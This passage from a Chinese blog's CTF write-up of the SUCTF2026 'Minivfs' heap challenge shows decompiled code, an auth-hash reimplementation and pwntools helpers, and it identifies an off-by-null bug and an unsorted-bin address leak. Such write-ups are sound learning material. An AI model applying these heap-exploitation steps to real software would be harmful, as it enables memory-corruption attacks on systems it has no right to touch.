@@ -1,0 +1,836 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+    
+      data-theme-mode="auto"
+    
+  >
+  <head>
+  
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_0khxww3tj3q9';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":100,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://Khighl.github.io.git';</script>
+  
+  <title>
+    Minivfs |
+    
+    Hexo
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  
+  
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_0khxww3tj3q9.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="SUCTF2026 Minivfs阻穷西征，岩何越焉？ 题目分析模拟了一套简单的虚拟文件系统 , 包含了几个常用接口 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Minivfs">
+<meta property="og:url" content="https://khighl.github.io.git/2026/03/18/minivfs/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="SUCTF2026 Minivfs阻穷西征，岩何越焉？ 题目分析模拟了一套简单的虚拟文件系统 , 包含了几个常用接口 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://khighl.github.io.git/images/minivfs/image-20260318204230528.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/minivfs/image-20260318204936526.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/minivfs/image-20260318205235303.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/minivfs/image-20260318210112795.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/minivfs/image-20260318210609570.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/minivfs/image-20260318210934492.png">
+<meta property="article:published_time" content="2026-03-17T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-03-18T13:38:05.743Z">
+<meta property="article:author" content="zer00ne">
+<meta property="article:tag" content="安全">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://khighl.github.io.git/images/minivfs/image-20260318204230528.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+  
+</div>
+<header id="header">
+  
+    
+      
+        <picture>
+          
+        </picture>
+        
+          <img  fetchpriority="high" src="/images/banner.webp" alt="Minivfs">
+        
+      
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">Minivfs</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        
+          <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SUCTF2026-Minivfs"><span class="toc-number">1.</span> <span class="toc-text">SUCTF2026 Minivfs</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">题目分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TOUCH"><span class="toc-number">1.1.1.</span> <span class="toc-text">TOUCH</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rm"><span class="toc-number">1.1.2.</span> <span class="toc-text">rm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#write"><span class="toc-number">1.1.3.</span> <span class="toc-text">write</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cat"><span class="toc-number">1.1.4.</span> <span class="toc-text">cat</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">攻击链分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">1.2.1.</span> <span class="toc-text">信息泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#off-by-null"><span class="toc-number">1.2.2.</span> <span class="toc-text">off-by-null</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#largebins-attack"><span class="toc-number">1.2.3.</span> <span class="toc-text">largebins-attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#House-of-some"><span class="toc-number">1.2.4.</span> <span class="toc-text">House of some</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getdents64"><span class="toc-number">1.2.5.</span> <span class="toc-text">getdents64</span></a></li></ol></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="zer00ne" class="lazyload">
+  <div class="sidebar-author-name">zer00ne</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">24</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">9</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+        
+      
+      
+        
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+        
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+  
+</aside>
+
+          <section id="main"><article id="post-minivfs" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link" data-aos="zoom-in">
+    <time datetime="2026-03-17T16:00:00.000Z" itemprop="datePublished">2026-03-18</time>
+    <time style="display: none;" id="post-update-time">2026-03-18</time>
+  </span>
+</div>
+
+      
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h1 id="SUCTF2026-Minivfs"><a href="#SUCTF2026-Minivfs" class="headerlink" title="SUCTF2026 Minivfs"></a>SUCTF2026 Minivfs</h1><p><strong>阻穷西征，岩何越焉？</strong></p>
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>模拟了一套简单的虚拟文件系统 , 包含了几个常用接口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; // eax</span><br><span class="line">  char *v4; // rax</span><br><span class="line">  int n5; // [rsp+Ch] [rbp-254h]</span><br><span class="line">  char *v7; // [rsp+10h] [rbp-250h]</span><br><span class="line">  char *s1; // [rsp+20h] [rbp-240h]</span><br><span class="line">  __int64 v9; // [rsp+28h] [rbp-238h]</span><br><span class="line">  __int64 v10; // [rsp+30h] [rbp-230h]</span><br><span class="line">  __int64 v11; // [rsp+38h] [rbp-228h]</span><br><span class="line">  __int64 v12; // [rsp+40h] [rbp-220h]</span><br><span class="line">  __int64 v13; // [rsp+48h] [rbp-218h]</span><br><span class="line">  _BYTE v14[520]; // [rsp+50h] [rbp-210h] BYREF</span><br><span class="line">  unsigned __int64 v15; // [rsp+258h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v15 = __readfsqword(0x28u);</span><br><span class="line">  init();</span><br><span class="line">  puts(&quot;mini-vfs ready.&quot;);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;vfs&gt; &quot;);</span><br><span class="line">    if ( input(0LL, v14, 512LL) &lt;= 0 )</span><br><span class="line">      return 0LL;</span><br><span class="line">    if ( v14[0] )</span><br><span class="line">    &#123;</span><br><span class="line">      s1 = 0LL;</span><br><span class="line">      v9 = 0LL;</span><br><span class="line">      v10 = 0LL;</span><br><span class="line">      v11 = 0LL;</span><br><span class="line">      v12 = 0LL;</span><br><span class="line">      v13 = 0LL;</span><br><span class="line">      n5 = 0;</span><br><span class="line">      v7 = v14;</span><br><span class="line">      while ( *v7 &amp;&amp; n5 &lt;= 5 )</span><br><span class="line">      &#123;</span><br><span class="line">        while ( *v7 &amp;&amp; ((*__ctype_b_loc())[(unsigned __int8)*v7] &amp; 0x2000) != 0 )</span><br><span class="line">          ++v7;</span><br><span class="line">        if ( !*v7 )</span><br><span class="line">          break;</span><br><span class="line">        v3 = n5++;</span><br><span class="line">        (&amp;s1)[v3] = v7;</span><br><span class="line">        while ( *v7 &amp;&amp; ((*__ctype_b_loc())[(unsigned __int8)*v7] &amp; 0x2000) == 0 )</span><br><span class="line">          ++v7;</span><br><span class="line">        if ( *v7 )</span><br><span class="line">        &#123;</span><br><span class="line">          v4 = v7++;</span><br><span class="line">          *v4 = 0;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      if ( n5 )</span><br><span class="line">      &#123;</span><br><span class="line">        if ( !strcmp(s1, &quot;exit&quot;) || !strcmp(s1, &quot;quit&quot;) )</span><br><span class="line">        &#123;</span><br><span class="line">          puts(&quot;bye&quot;);</span><br><span class="line">          return 0LL;</span><br><span class="line">        &#125;</span><br><span class="line">        if ( !strcmp(s1, &quot;ls&quot;) )</span><br><span class="line">        &#123;</span><br><span class="line">          ls();                                 // only printf</span><br><span class="line">        &#125;</span><br><span class="line">        else if ( !strcmp(s1, &quot;stat&quot;) )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( n5 != 3 )</span><br><span class="line">            goto LABEL_39;</span><br><span class="line">          stat(v9, v10);</span><br><span class="line">        &#125;</span><br><span class="line">        else if ( !strcmp(s1, &quot;touch&quot;) )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( n5 != 4 )</span><br><span class="line">            goto LABEL_39;</span><br><span class="line">          touch(v9, v10, v11);</span><br><span class="line">        &#125;</span><br><span class="line">        else if ( !strcmp(s1, &quot;rm&quot;) )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( n5 != 3 )</span><br><span class="line">            goto LABEL_39;</span><br><span class="line">          rm(v9, v10);</span><br><span class="line">        &#125;</span><br><span class="line">        else if ( !strcmp(s1, &quot;cat&quot;) )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( n5 == 3 )</span><br><span class="line">            cat(v9, v10);</span><br><span class="line">          else</span><br><span class="line">LABEL_39:</span><br><span class="line">            puts(&quot;[err] incorrect command.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else if ( !strcmp(s1, &quot;write&quot;) )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( n5 != 4 )</span><br><span class="line">            goto LABEL_39;</span><br><span class="line">          write_0(v9, v10, v11);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">          puts(&quot;unknown command.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中touch对应add , rm对应delet , cat对应show , write对应edit</p>
+<p>stat和ls则可以查看单个文件的情况和整体文件的列表</p>
+<h3 id="TOUCH"><a href="#TOUCH" class="headerlink" title="TOUCH"></a>TOUCH</h3><p><img src="/./../images/minivfs/image-20260318204230528.png" alt="image-20260318204230528"></p>
+<p>经过了一定程度的混淆, 使用的规则为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch &lt;filename&gt; &lt;size&gt; &lt;auth&gt;</span><br></pre></td></tr></table></figure>
+
+<p>其中auth有一套简单的哈希计算逻辑</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall sub_15F6(__int64 a1, int *a2)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v2; // eax</span><br><span class="line">  unsigned int v4; // [rsp+1Ch] [rbp-4h]</span><br><span class="line">  int v5; // [rsp+1Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  v2 = sub_15AB(a1);</span><br><span class="line">  v4 = 0x846CA68B * (((0x7FEB352D * (HIWORD(v2) ^ v2)) &gt;&gt; 15) ^ (0x7FEB352D * (HIWORD(v2) ^ v2)));</span><br><span class="line">  v5 = HIWORD(v4) ^ v4;</span><br><span class="line">  if ( a2 )</span><br><span class="line">    *a2 = v5;</span><br><span class="line">  return v5 &amp; 0xF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>size的大小必须位于(0x417 , 0x500] , 也就是largebins的范围 ; 堆指针会被储存在全局变量中</p>
+<p>我们可以用一个简单的脚本得出filename对应的hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">def calc_auth(path: str) -&gt; int:</span><br><span class="line">    v = 0x811C9DC5</span><br><span class="line">    for ch in path.encode():</span><br><span class="line">        v = ((ch ^ v) * 16777619) &amp; 0xFFFFFFFF</span><br><span class="line">    t = ((v &gt;&gt; 16) ^ v) &amp; 0xFFFFFFFF</span><br><span class="line">    t = (0x7FEB352D * t) &amp; 0xFFFFFFFF</span><br><span class="line">    t = ((t &gt;&gt; 15) ^ t) &amp; 0xFFFFFFFF</span><br><span class="line">    v4 = (0x846CA68B * t) &amp; 0xFFFFFFFF</span><br><span class="line">    h = ((v4 &gt;&gt; 16) ^ v4) &amp; 0xFFFFFFFF</span><br><span class="line">    return h ^ AUTH_XOR</span><br></pre></td></tr></table></figure>
+
+<h3 id="rm"><a href="#rm" class="headerlink" title="rm"></a>rm</h3><p>使用规则为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm &lt;filename&gt; &lt;auth&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/minivfs/image-20260318204936526.png" alt="image-20260318204936526"></p>
+<p>可以看到不存在uaf</p>
+<h3 id="write"><a href="#write" class="headerlink" title="write"></a>write</h3><p>使用规则为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">write &lt;path&gt; &lt;nbytes&gt; &lt;auth&gt;</span><br><span class="line">&lt;body&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/minivfs/image-20260318205235303.png" alt="image-20260318205235303"></p>
+<p>注意到, 这里memcpy后, 会把末尾+1的bytes进行置零操作</p>
+<p>所以这里存在off-by-null操作</p>
+<h3 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h3><p>使用规则为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &lt;path&gt; &lt;auth&gt;</span><br></pre></td></tr></table></figure>
+
+<p>比较常规没什么好说的</p>
+<hr>
+<p>可以看到每种hash只有一个全局变量的槽位</p>
+<p>也就是即使名字不同也可能存在哈希碰撞, 这一点要特别注意, 以免堆块申请失败</p>
+<p>可以编写出如下的辅助函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">from __future__ import annotations</span><br><span class="line">from typing import Optional, Union</span><br><span class="line">from pwn import *</span><br><span class="line">context.arch=&#x27;amd64&#x27;</span><br><span class="line">PROMPT = b&quot;vfs&gt; &quot;</span><br><span class="line">AUTH_XOR = 0xA5A5A5A5</span><br><span class="line">def calc_auth(path: str) -&gt; int:</span><br><span class="line">    v = 0x811C9DC5</span><br><span class="line">    for ch in path.encode():</span><br><span class="line">        v = ((ch ^ v) * 16777619) &amp; 0xFFFFFFFF</span><br><span class="line">    t = ((v &gt;&gt; 16) ^ v) &amp; 0xFFFFFFFF</span><br><span class="line">    t = (0x7FEB352D * t) &amp; 0xFFFFFFFF</span><br><span class="line">    t = ((t &gt;&gt; 15) ^ t) &amp; 0xFFFFFFFF</span><br><span class="line">    v4 = (0x846CA68B * t) &amp; 0xFFFFFFFF</span><br><span class="line">    h = ((v4 &gt;&gt; 16) ^ v4) &amp; 0xFFFFFFFF</span><br><span class="line">    return h ^ AUTH_XOR</span><br><span class="line"></span><br><span class="line">def _fmt_num(x: Union[int, str]) -&gt; str:</span><br><span class="line">    return x if isinstance(x, str) else hex(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def _send_cmd(cmd: str) -&gt; bytes:</span><br><span class="line">    io.sendline(cmd.encode())</span><br><span class="line">    return io.recvuntil(PROMPT, drop=True)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def touch(path: str, size: Union[int, str]) -&gt; bytes:</span><br><span class="line">    auth = calc_auth(path)</span><br><span class="line">    return _send_cmd(f&quot;touch &#123;path&#125; &#123;_fmt_num(size)&#125; 0x&#123;auth:08x&#125;&quot;)</span><br><span class="line"></span><br><span class="line">def write(path, data, nbytes=None):</span><br><span class="line">    if isinstance(data, str):</span><br><span class="line">        data = data.encode()</span><br><span class="line">    if nbytes is None:</span><br><span class="line">        nbytes = len(data)</span><br><span class="line">    assert len(data) == nbytes</span><br><span class="line"></span><br><span class="line">    io.sendline(f&quot;write &#123;path&#125; &#123;nbytes&#125; 0x&#123;calc_auth(path):08x&#125;&quot;.encode())</span><br><span class="line">    io.sendafter(f&quot;body(&#123;nbytes&#125; bytes) &gt; &quot;.encode(), data)</span><br><span class="line">#    return io.recvuntil(b&quot;vfs&gt; &quot;, drop=True)</span><br><span class="line"></span><br><span class="line">def stat(path: str) -&gt; bytes:</span><br><span class="line">    auth = calc_auth(path)</span><br><span class="line">    return _send_cmd(f&quot;stat &#123;path&#125; 0x&#123;auth:08x&#125;&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def rm(path: str) -&gt; bytes:</span><br><span class="line">    auth = calc_auth(path)</span><br><span class="line">    return _send_cmd(f&quot;rm &#123;path&#125; 0x&#123;auth:08x&#125;&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def cat(path: str) -&gt; bytes:</span><br><span class="line">    auth = calc_auth(path)</span><br><span class="line">    return _send_cmd(f&quot;cat &#123;path&#125; 0x&#123;auth:08x&#125;&quot;)</span><br><span class="line">def bug():</span><br><span class="line">    gdb.attach(io)</span><br></pre></td></tr></table></figure>
+
+<h2 id="攻击链分析"><a href="#攻击链分析" class="headerlink" title="攻击链分析"></a>攻击链分析</h2><h3 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h3><p>我们可以发现, 当被rm的file地址再次被touch , touch原语并没有清除原本地址内的指针数据</p>
+<p>于是我们可以轻松地利用unsortedbins泄露出堆地址和libc地址</p>
